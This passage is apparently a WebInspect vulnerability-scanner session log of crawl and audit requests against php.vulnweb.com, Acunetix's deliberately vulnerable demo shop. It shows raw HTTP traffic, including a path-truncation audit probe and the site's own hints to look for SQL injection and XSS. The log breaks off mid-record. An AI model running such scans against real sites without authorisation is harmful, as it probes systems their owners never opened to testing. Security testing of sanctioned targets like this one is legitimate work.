Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:48 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 5

0

]]></RawResponse><Request id="CFFD08A5584F7DA1C8D9D7C07E63DE5A"><Method>GET</Method><Path>/_mmServerScripts/</Path><File>mysql</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/_mmServerScripts/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="CFFD08A5584F7DA1C8D9D7C07E63DE5A";PSID="A1CEE9CF6012D777107AAAB260D61287";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="2443010b";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="0a8e6536";sc="1";tid="38";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[0

]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:48 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>5</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="EA993554057D330F75062CA8878A4CE6"><URL>http://php.vulnweb.com:80/showimage.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="EA993554057D330F75062CA8878A4CE6"><![CDATA[GET /showimage.php HTTP/1.1
Referer: http://php.vulnweb.com/showimage.php?file='%20+%20pict.item(0).firstChild.nodeValue%20+
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="EA993554057D330F75062CA8878A4CE6";PSID="9B1A0748B2C2E30F929A64AC5809F506";SessionType="PathTruncation";CrawlType="None";AttackType="None";OriginatingEngineID="398bfe9e-1b77-4458-9691-603eea06e341";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="0";Engine="Path+Truncation";SmartMode="4";tid="58";tt="11";
X-RequestManager-Memo: sid="45";smi="0";sc="1";ID="73a16219";
X-Request-Memo: ID="77dfea60";sc="1";tid="48";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:48:06 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 3

 
]]></RawResponse><Request id="EA993554057D330F75062CA8878A4CE6"><Method>GET</Method><Path>/</Path><File>showimage</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/showimage.php?file='%20+%20pict.item(0).firstChild.nodeValue%20+</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="EA993554057D330F75062CA8878A4CE6";PSID="9B1A0748B2C2E30F929A64AC5809F506";SessionType="PathTruncation";CrawlType="None";AttackType="None";OriginatingEngineID="398bfe9e-1b77-4458-9691-603eea06e341";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="0";Engine="Path+Truncation";SmartMode="4";tid="58";tt="11";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="45";smi="0";sc="1";ID="73a16219";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="77dfea60";sc="1";tid="48";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[ 
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:48:06 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>3</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="9E6C877AA131AD437C7CCB4E24D75A01"><URL>http://php.vulnweb.com:80/guestbook.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="9E6C877AA131AD437C7CCB4E24D75A01"><![CDATA[POST /guestbook.php HTTP/1.1
Referer: http://php.vulnweb.com/guestbook.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="9E6C877AA131AD437C7CCB4E24D75A01";PSID="4B3049C9BE5176469488667153D76A50";SessionType="Crawl";CrawlType="Form";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="action";Format="Qualified";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="139f0ba2";
X-Request-Memo: ID="cfa3b9b3";sc="1";tid="37";
Cookie: CustomCookie=WebInspect0

name=anonymous%20user&text=12345&submit=add%20message]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:48 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 5409

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>guestbook</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<div class="story">
	<table width="100%" cellpadding="4" cellspacing="1"><tr><td colspan="2"><h2>Our guestbook</h2></td></tr><tr><td align="left" valign="middle" style="background-color:#F5F5F5"><strong>anonymous user</strong></td><td align="right" style="background-color:#F5F5F5">12.11.2020, 9:44 pm</td></tr><tr><td colspan="2"><img src="/images/remark.gif">&nbsp;&nbsp;12345</td></tr></table>	 </div>
	  <div class="story">
	  	<form action="" method="post" name="faddentry">
			<input type="hidden" name="name" value="anonymous user">
			<textarea name="text" rows="5" wrap="VIRTUAL" style="width:500px;"></textarea>
			<br>
			<input type="submit" name="submit" value="add message">
		</form>
	  </div>
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="9E6C877AA131AD437C7CCB4E24D75A01"><Method>POST</Method><Path>/</Path><File>guestbook</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData>name=anonymous%20user&amp;text=12345&amp;submit=add%20message</FullPostData><XMLPostData /><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/guestbook.php</Value></Header><Header><Name>Content-Type</Name><Value>application/x-www-form-urlencoded</Value></Header><Header><Name>Content-Length</Name><Value>53</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="9E6C877AA131AD437C7CCB4E24D75A01";PSID="4B3049C9BE5176469488667153D76A50";SessionType="Crawl";CrawlType="Form";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="action";Format="Qualified";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="139f0ba2";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="cfa3b9b3";sc="1";tid="37";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>guestbook</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<div class="story">
	<table width="100%" cellpadding="4" cellspacing="1"><tr><td colspan="2"><h2>Our guestbook</h2></td></tr><tr><td align="left" valign="middle" style="background-color:#F5F5F5"><strong>anonymous user</strong></td><td align="right" style="background-color:#F5F5F5">12.11.2020, 9:44 pm</td></tr><tr><td colspan="2"><img src="/images/remark.gif">&nbsp;&nbsp;12345</td></tr></table>	 </div>
	  <div class="story">
	  	<form action="" method="post" name="faddentry">
			<input type="hidden" name="name" value="anonymous user">
			<textarea name="text" rows="5" wrap="VIRTUAL" style="width:500px;"></textarea>
			<br>
			<input type="submit" name="submit" value="add message">
		</form>
	  </div>
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:48 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>5409</Value></Header></Headers><SetCookies /><Forms><Form><Action /><Method>post</Method><Name>faddentry</Name><OnSubmit /><InputFields><InputField><Name>name</Name><Value>anonymous user</Value><Size /><MaxLength>0</MaxLength><sType>hidden</sType><Class /></InputField><InputField><Name>submit</Name><Value>add message</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas><TextArea><Name>text</Name><Value /><MaxLength>0</MaxLength><Class /></TextArea></TextAreas><SelectFields /></Form><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="83F9EB317EE995AEC84659A28337077D"><URL>http://php.vulnweb.com:80/search.php?test=query</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="83F9EB317EE995AEC84659A28337077D"><![CDATA[GET /search.php?test=query HTTP/1.1
Referer: http://php.vulnweb.com/Templates/main_dynamic_template.dwt.php
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="83F9EB317EE995AEC84659A28337077D";PSID="93D28727FA66621A9E828329B6210531";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="action";Format="Relative";LinkKind="FormAction";Locations="HtmlNode";NodeName="form";Source="StaticParser";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="5c9aa26b";
X-Request-Memo: ID="2995c044";sc="1";tid="38";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:48 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 4732

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>search</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="83F9EB317EE995AEC84659A28337077D"><Method>GET</Method><Path>/</Path><File>search</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>test=query</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>test</Name><Value>query</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/Templates/main_dynamic_template.dwt.php</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 